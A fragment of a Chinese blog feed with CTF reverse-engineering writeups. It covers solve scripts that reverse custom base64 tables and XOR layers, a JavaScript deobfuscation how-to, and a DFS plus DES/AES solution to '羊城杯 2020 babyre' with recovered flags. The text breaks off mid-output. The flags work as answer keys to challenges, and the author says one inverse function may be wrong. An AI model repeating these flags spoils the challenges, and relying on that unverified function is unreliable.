v7_arr[v6] = v7;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (v6 % <span class="number">3</span> == <span class="number">2</span>) &#123;</span><br><span class="line">            v7 = (v7 + <span class="number">7</span>) % <span class="number">19</span>;</span><br><span class="line">            v7_arr[v6] = v7;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            v7 = (v7 + <span class="number">3</span>) % <span class="number">17</span>;</span><br><span class="line">            v7_arr[v6] = v7;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> base64_table[] = <span class="string">&quot;plxXOZtaiUneJIhk7qSYEjD1Km94o0FTu52VQgNL3vCBH8zsA/b+dycGPRMwWfr6&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; ++i)</span><br><span class="line">        base64_table[i] ^= <span class="number">0x27</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> v5[<span class="number">30</span>]; <span class="comment">// base表提取</span></span><br><span class="line">    <span class="built_in">strncpy</span>(v5, &amp;base64_table[<span class="number">6</span>], <span class="number">21</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;table:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">21</span>; ++i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>, v5[i]);</span><br><span class="line">    <span class="type">char</span> v3;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">46</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">3</span> == <span class="number">1</span>) &#123;</span><br><span class="line">            v3 = v5[v7_arr[i] + <span class="number">1</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i % <span class="number">3</span> == <span class="number">2</span>) &#123;</span><br><span class="line">            v3 = v5[v7_arr[i] + <span class="number">2</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            v3 = v5[v7_arr[i] + <span class="number">3</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        aKqhfyc[i + <span class="number">1</span>] ^= aKqhfyc[i];</span><br><span class="line">        aKqhfyc[i] ^= v3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nenc(last):\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">48</span>; ++i)</span><br><span class="line">        <span class="comment">// putchar(aKqhfyc[i]);</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, aKqhfyc[i]);</span><br><span class="line">    <span class="comment">// 得到的结果为:</span></span><br><span class="line">    <span class="comment">// WZqSWcUtWBLlOriEfcajWBSRstLlkEfFWR7j/R7dMCDGnp==</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后将该结果依次进行对应的base64编码解码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base64_decode</span>(<span class="params">enc=<span class="string">&#x27;&#x27;</span>, new_table=<span class="string">&#x27;&#x27;</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="comment"># base64编码为可见字符</span></span><br><span class="line">    <span class="comment"># 解码结果为bytes类型---因为可能是对字节流进行base64编码</span></span><br><span class="line">    <span class="keyword">if</span> new_table == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;basic base64 decode!&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> base64.b64decode(enc)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;base64 decode with new_table: &#x27;</span> + new_table)</span><br><span class="line">        orignal_table = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">        dec = base64.b64decode(enc.translate(<span class="built_in">str</span>.maketrans(new_table, orignal_table)))</span><br><span class="line">        <span class="keyword">return</span> dec</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base64_encode</span>(<span class="params">src=<span class="string">b&#x27;&#x27;</span>, new_table=<span class="string">&#x27;&#x27;</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="comment"># 待编码的数据为bytes类型,因为可能是对字节流进行base64编码</span></span><br><span class="line">    <span class="comment"># 编码结果为str类型---因为base64编码后的数据为可见字符</span></span><br><span class="line">    <span class="keyword">if</span> new_table == <span class="string">b&#x27;&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;basic base64 encode!&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> base64.b64encode(src).decode()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;base64 encode with new_table: &#x27;</span> + new_table)</span><br><span class="line">        orignal_table = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">        enc = base64.b64encode(src).decode().translate(<span class="built_in">str</span>.maketrans(orignal_table, new_table))</span><br><span class="line">        <span class="keyword">return</span> enc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_decode</span>():</span><br><span class="line">    <span class="comment"># 动调得到的表</span></span><br><span class="line">    fir_table = <span class="string">&quot;l+USN4J5Rfj0TaVOcnzXiPGZIBpoAExuQtHyKD692hwmqe7/Mgk8v1sdCW3bYFLr&quot;</span></span><br><span class="line">    tables = [</span><br><span class="line">        <span class="string">&quot;FGseVD3ibtHWR1czhLnUfJK6SEZ2OyPAIpQoqgY0w49u+7rad5CxljMXvNTBkm/8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Hc0xwuZmy3DpQnSgj2LhUtrlVvNYks+BX/MOoETaKqR4eb9WF8ICGzf6id1P75JA&quot;</span>,</span><br><span class="line">        <span class="string">&quot;pnHQwlAveo4DhGg1jE3SsIqJ2mrzxCiNb+Mf0YVd5L8c97/WkOTtuKFZyRBUPX6a&quot;</span>,</span><br><span class="line">        <span class="string">&quot;plxXOZtaiUneJIhk7qSYEjD1Km94o0FTu52VQgNL3vCBH8zsA/b+dycGPRMwWfr6&quot;</span></span><br><span class="line">    ]</span><br><span class="line">    <span class="comment"># 将最后一个加密的逆生成的结果复制至此</span></span><br><span class="line">    flag = <span class="string">&#x27;WZqSWcUtWBLlOriEfcajWBSRstLlkEfFWR7j/R7dMCDGnp==&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="comment"># 逆变换</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(<span class="number">4</span>)):</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">            flag = base64_decode(flag, tables[i])</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag = base64_encode(flag, tables[i])</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">    flag = base64_decode(flag, fir_table)</span><br><span class="line">    <span class="built_in">print</span>(flag.decode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    run_decode()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最终跑出的结果缺一个<code>右花括号&quot;&#125;&quot;</code>,加上即可:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240206110056306.png" alt="image-20240206110056306" style="zoom:50%;" /><p>结果:<code>flag&#123;3ea590ccwxehg715264fzxnzepqz&#125;</code></p><p>结束…</p><p>附注当时写的sub_401250()的逆函数:(后来发现纯闲的…这个逆函数是否正确也忘记了…)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> table[<span class="number">64</span>]; <span class="comment">// base64表声明,为全局数组,等价于原代码中的aLUsn4j5rfj0tav[]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 该函数理论上和sub_401250()互为逆运算</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">reverse_sub_401250</span><span class="params">(<span class="type">char</span> *str, <span class="type">char</span> *res)</span> &#123;</span><br><span class="line">    <span class="comment">// str是加密后的字符串, res是逆向解密后的字符串,table是base64表(当前的变表,需要逆向得出)</span></span><br><span class="line">    <span class="comment">// 代码不保证正确,麻烦自行检查,关键是当原字符串有1个=或2个=时的处理</span></span><br><span class="line">    <span class="comment">// 当原字符串有1个=时,idx_3低2位为全0</span></span><br><span class="line">    <span class="comment">// 当原字符串有2个=时,idx_2低4位为全0</span></span><br><span class="line">    <span class="comment">// 因此信息不会丢失,但是逆向时(本函数)需要根据这些信息来恢复原字符串</span></span><br><span class="line">    <span class="comment">// 这个问题麻烦检查一下</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> idx_1, idx_2, idx_3, idx_4;</span><br><span class="line">    <span class="type">int</span> res_idx = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> str_idx = <span class="number">0</span>; str_idx &lt; len; str_idx += <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="comment">// 密文不是4个字节一起,而是最多3个字节一起,需要检查</span></span><br><span class="line">        <span class="type">int</span> cur_case = <span class="number">0</span>;<span class="comment">//默认无等号</span></span><br><span class="line">        <span class="keyword">if</span> (str[str_idx + <span class="number">2</span>] == <span class="string">&#x27;\0&#x27;</span>) <span class="comment">// 密文只有2个字节,有1个等号</span></span><br><span class="line">            cur_case = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (str[str_idx + <span class="number">1</span>] == <span class="string">&#x27;\0&#x27;</span>) <span class="comment">// 密文只有1个字节,有2个等号</span></span><br><span class="line">            cur_case = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cur_case == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 正常的3个字节一起的情况</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">char</span> result; <span class="comment">// 存储计算好的下标值</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">char</span> tmp1, tmp2; <span class="comment">// 存储某2个字节</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 第一个字符</span></span><br><span class="line">            tmp1 = str[str_idx];</span><br><span class="line">            <span class="comment">// 取tmp1高6位,右移2位,高2位为0,即第一个下标值idx_1</span></span><br><span class="line">            result = (tmp1 &gt;&gt; <span class="number">2</span>);</span><br><span class="line">            res[res_idx++] = table[result];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 第二个字符</span></span><br><span class="line">            tmp1 = str[str_idx];</span><br><span class="line">            tmp2 = str[str_idx + <span class="number">1</span>];</span><br><span class="line">            <span class="comment">// 取tmp1低2位左移4位,和tmp2高4位右移4位,合并后的结果为第二个下标值idx_2</span></span><br><span class="line">            result = ((tmp1 &amp; <span class="number">0x3</span>) &lt;&lt; <span class="number">4</span>) | (tmp2 &gt;&gt; <span class="number">4</span>);</span><br><span class="line">            res[res_idx++] = table[result];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 第三个字符</span></span><br><span class="line">            tmp1 = str[str_idx + <span class="number">1</span>];</span><br><span class="line">            tmp2 = str[str_idx + <span class="number">2</span>];</span><br><span class="line">            <span class="comment">// 取tmp1低4位左移2位,和tmp2高2位右移6位,合并后的结果为第三个下标值idx_3</span></span><br><span class="line">            result = ((tmp1 &amp; <span class="number">0xf</span>) &lt;&lt; <span class="number">2</span>) | (tmp2 &gt;&gt; <span class="number">6</span>);</span><br><span class="line">            res[res_idx++] = table[result];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 第四个字符</span></span><br><span class="line">            tmp1 = str[str_idx + <span class="number">2</span>];</span><br><span class="line">            <span class="comment">// 取tmp1低6位,即第四个下标值idx_4</span></span><br><span class="line">            result = (tmp1 &amp; <span class="number">0x3f</span>);</span><br><span class="line">            res[res_idx++] = table[result];</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cur_case == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="comment">// 密文只有2个字节,有1个等号</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">char</span> result; <span class="comment">// 存储计算好的下标值</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">char</span> tmp1, tmp2; <span class="comment">// 存储某2个字节</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 第一个字符</span></span><br><span class="line">            tmp1 = str[str_idx];</span><br><span class="line">            <span class="comment">// 取tmp1高6位,右移2位,高2位为0,即第一个下标值idx_1</span></span><br><span class="line">            result = (tmp1 &gt;&gt; <span class="number">2</span>);</span><br><span class="line">            res[res_idx++] = table[result];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 第二个字符</span></span><br><span class="line">            tmp1 = str[str_idx];</span><br><span class="line">            tmp2 = str[str_idx + <span class="number">1</span>];</span><br><span class="line">            <span class="comment">// 取tmp1低2位左移4位,和tmp2高4位右移4位,合并后的结果为第二个下标值idx_2</span></span><br><span class="line">            result = ((tmp1 &amp; <span class="number">0x3</span>) &lt;&lt; <span class="number">4</span>) | (tmp2 &gt;&gt; <span class="number">4</span>);</span><br><span class="line">            res[res_idx++] = table[result];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 第三个字符</span></span><br><span class="line">            tmp2 = str[str_idx + <span class="number">2</span>];</span><br><span class="line">            <span class="comment">// 取tmp2低4位左移2位,低2位为0,即第三个下标值idx_3</span></span><br><span class="line">            result = ((tmp2 &amp; <span class="number">0xf</span>) &lt;&lt; <span class="number">2</span>);</span><br><span class="line">            res[res_idx++] = table[result];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 第四个字符</span></span><br><span class="line">            <span class="comment">// 补齐一个等号</span></span><br><span class="line">            res[res_idx++] = <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cur_case == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="comment">// 密文只有1个字节,有2个等号</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">char</span> result; <span class="comment">// 存储计算好的下标值</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">char</span> tmp1; <span class="comment">// 存储这1个字节</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 第一个字符</span></span><br><span class="line">            tmp1 = str[str_idx];</span><br><span class="line">            <span class="comment">// 取tmp1高6位,右移2位,高2位为0,即第一个下标值idx_1</span></span><br><span class="line">            result = (tmp1 &gt;&gt; <span class="number">2</span>);</span><br><span class="line">            res[res_idx++] = table[result];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 第二个字符</span></span><br><span class="line">            tmp1 = str[str_idx];</span><br><span class="line">            <span class="comment">// 取tmp1低2位左移4位,低4位为0,即第二个下标值idx_2</span></span><br><span class="line">            result = ((tmp1 &amp; <span class="number">0x3</span>) &lt;&lt; <span class="number">4</span>);</span><br><span class="line">            res[res_idx++] = table[result];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 补齐2个等号</span></span><br><span class="line">            res[res_idx++] = <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">            res[res_idx++] = <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS逆向</title>
      <link href="/2024803e41a84ef1/"/>
      <url>/2024803e41a84ef1/</url>
      
        <content type="html"><![CDATA[<h1 id="反混淆">反混淆</h1><h2 id="使用synchrony工具反混淆">使用synchrony工具反混淆</h2><p>形如这样的混淆代码:</p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240204230942633.png" alt="image-20240204230942633" style="zoom:50%;" /><p>可以使用<a href="https://github.com/relative/synchrony?tab=readme-ov-file">synchrony</a>工具来反混淆.</p><p>需要使用npm来安装,在终端的安装命令如下:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --global deobfuscator</span><br></pre></td></tr></table></figure><p>安装后,就可以使用如下命令反混淆js文件(以index.js举例):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">synchrony deobfuscate index.js</span><br></pre></td></tr></table></figure><p>成功后,原JS文件同目录下多出的index.cleaned.js即为反混淆后的代码文件.</p><h2 id="在线反混淆">在线反混淆</h2><p><a href="https://dev-coco.github.io/Online-Tools/JavaScript-Deobfuscator.html">https://dev-coco.github.io/Online-Tools/JavaScript-Deobfuscator.html</a></p>]]></content>
      
      
      <categories>
          
          <category> others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp-羊城杯系列刷题</title>
      <link href="/2024625ace0fe402/"/>
      <url>/2024625ace0fe402/</url>
      
        <content type="html"><![CDATA[<h1 id="羊城杯-2020-babyre">[羊城杯 2020]babyre</h1><p>本题2个输入,第一个是DES加密,输入的是第二步AES使用到的密钥.</p><p>第2步所在的函数需要动调解SMC.</p><p>进入后搜索关键值(S盒),发现是AES加密,另还有2步加密,需要深搜(解不唯一)爆破得出.</p><p>题目逻辑不难,但是比较大,脚本一开始没写对QWQ</p><p>python代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"># 添加库</span><br><span class="line">from Crypto.Cipher import DES, AES</span><br><span class="line"></span><br><span class="line">byte_604100 = [</span><br><span class="line">    <span class="number">189</span>, <span class="number">173</span>, <span class="number">180</span>, <span class="number">132</span>, <span class="number">16</span>, <span class="number">99</span>, <span class="number">179</span>, <span class="number">225</span>, <span class="number">198</span>, <span class="number">132</span>, <span class="number">45</span>, <span class="number">111</span>, <span class="number">186</span>, <span class="number">136</span>, <span class="number">116</span>, <span class="number">196</span>, <span class="number">144</span>, <span class="number">50</span>, <span class="number">234</span>, <span class="number">46</span>, <span class="number">198</span>, <span class="number">40</span>, <span class="number">101</span>, <span class="number">112</span>,</span><br><span class="line">    <span class="number">201</span>, <span class="number">117</span>, <span class="number">120</span>, <span class="number">160</span>, <span class="number">11</span>, <span class="number">159</span>, <span class="number">166</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># 输出<span class="number">16</span>进制</span><br><span class="line"><span class="meta"># for i in range(len(byte_604100)):</span></span><br><span class="line"><span class="meta">#     print(hex(byte_604100[i]), end=<span class="string">&#x27;,&#x27;</span>)</span></span><br><span class="line"><span class="meta"># input()</span></span><br><span class="line"></span><br><span class="line">dec_list1 = [<span class="number">0</span>] * <span class="number">32</span></span><br><span class="line">dec_list1[<span class="number">31</span>] = <span class="number">0xc4</span></span><br><span class="line">possible = []</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> ( k = <span class="number">1</span>; k &lt;= <span class="number">31</span>; ++k )                   <span class="comment">// 下文已知byte_6040D0[],可提取出</span></span><br><span class="line">                                                <span class="comment">// 也许需要爆破input_flag[]的最后一个字节?</span></span><br><span class="line">                                                <span class="comment">// 30行的求模这步应该构成一个有限域,不影响逆运算的单射性(?)</span></span><br><span class="line">    byte_6040D0[k - <span class="number">1</span>] = (<span class="number">2</span> * (input_flag[k - <span class="number">1</span>] ^ <span class="number">19</span>) + <span class="number">7</span>) ^ ((<span class="type">unsigned</span> __int8)input_flag[k - <span class="number">1</span>] % <span class="number">9u</span></span><br><span class="line">                                                             + input_flag[k]</span><br><span class="line">                                                             + <span class="number">2</span>);</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_">dfs</span><span class="params">(idx, cur_list)</span>:</span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">-1</span>:</span><br><span class="line">        possible.append(cur_list[:])</span><br><span class="line">        print(cur_list)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    _cur_list = cur_list[:]</span><br><span class="line">    <span class="keyword">for</span> j in range(<span class="number">256</span>):</span><br><span class="line">        test_encoded_byte = ((((<span class="number">2</span> * (j ^ <span class="number">0x13</span>)) + <span class="number">7</span>) ^ ((j % <span class="number">9</span>) + _cur_list[idx + <span class="number">1</span>] + <span class="number">2</span>)) &amp; <span class="number">0xff</span>)</span><br><span class="line">        <span class="keyword">if</span> test_encoded_byte == byte_604100[idx]:</span><br><span class="line">            _cur_list[idx] = j</span><br><span class="line">            dfs(idx - <span class="number">1</span>, _cur_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dfs(<span class="number">30</span>, dec_list1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in possible:</span><br><span class="line">    print(i)</span><br><span class="line">print(len(possible))</span><br><span class="line"></span><br><span class="line">DES_enc_list = [<span class="number">10</span>, <span class="number">244</span>, <span class="number">238</span>, <span class="number">200</span>, <span class="number">66</span>, <span class="number">138</span>, <span class="number">155</span>, <span class="number">219</span>, <span class="number">162</span>, <span class="number">38</span>, <span class="number">111</span>, <span class="number">238</span>, <span class="number">238</span>, <span class="number">224</span>, <span class="number">216</span>, <span class="number">162</span>]</span><br><span class="line">DES_enc = b<span class="number">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i in DES_enc_list:</span><br><span class="line">    DES_enc += bytes([i])</span><br><span class="line">print()</span><br><span class="line">print(DES_enc)</span><br><span class="line">print()</span><br><span class="line">DES_key = b<span class="number">&#x27;</span>\xAD\x52\xF2\x4C\xE3\x2C\x20\xD6<span class="number">&#x27;</span></span><br><span class="line">iv = b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span> * <span class="number">8</span></span><br><span class="line">DES_dec = DES.new(DES_key, DES.MODE_CBC, iv).decrypt(DES_enc)</span><br><span class="line">AES_key = DES_dec</span><br><span class="line"></span><br><span class="line"><span class="meta"># iv = b<span class="string">&#x27;\x00&#x27;</span> * 16</span></span><br><span class="line"><span class="keyword">for</span> x in possible:</span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">31</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">        <span class="keyword">for</span> j in range(<span class="type">int</span>(i / <span class="number">4</span>)):</span><br><span class="line">            x[i] ^= x[j]</span><br><span class="line">    res = AES.new(AES_key, AES.MODE_ECB).decrypt(bytes(x))</span><br><span class="line">    print(res)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># ... 略 ...</span><br><span class="line">b<span class="number">&#x27;</span>\xd0UH\x9e\x1br\x11\xb0\xe4\xb1kc\xd3\xbd\xcf_\xb0l&gt;\x9cv\xe7\x9bg\xe4\xcdm&lt;J&#123;W\xf1<span class="number">&#x27;</span></span><br><span class="line">b<span class="number">&#x27;</span>GWHT&#123;th1s_gam3_1s_s0_c00l_and_d&#125;&#x27;</span><br><span class="line">b<span 